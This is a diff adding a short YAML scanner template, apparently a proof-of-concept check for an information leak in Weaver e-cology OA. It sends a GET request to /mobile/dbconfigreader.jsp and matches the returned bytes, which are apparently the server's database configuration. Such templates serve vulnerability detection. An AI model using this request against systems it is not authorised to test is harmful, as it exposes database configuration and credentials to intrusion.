@@ -1,0 +1,19 @@
+name: yaml-poc-weaver-weaver_e_cology_oa-leak-CT-490564
+binding: e2a40bcf-fb9f-4b0d-ba75-305d9c13a5b0
+detail:
+    author: system_user
+    links:
+        - https://mp.weixin.qq.com/s/zTEUan_BtDDzuHzmd9pxYg
+    vulnerability:
+        id: e6f384cc-eba5-408a-ab9c-3d86222e5eea
+        level: high
+transport: http
+rules:
+    r0:
+        request:
+            cache: true
+            method: GET
+            path: /mobile/dbconfigreader.jsp
+            follow_redirects: false
+        expression: response.status == 200 && response.content_type.icontains("text/html") && response.body.bcontains(b"\x8a\xd2\xf1\xd4\x98~p\x05Sn")
+expression: r0()
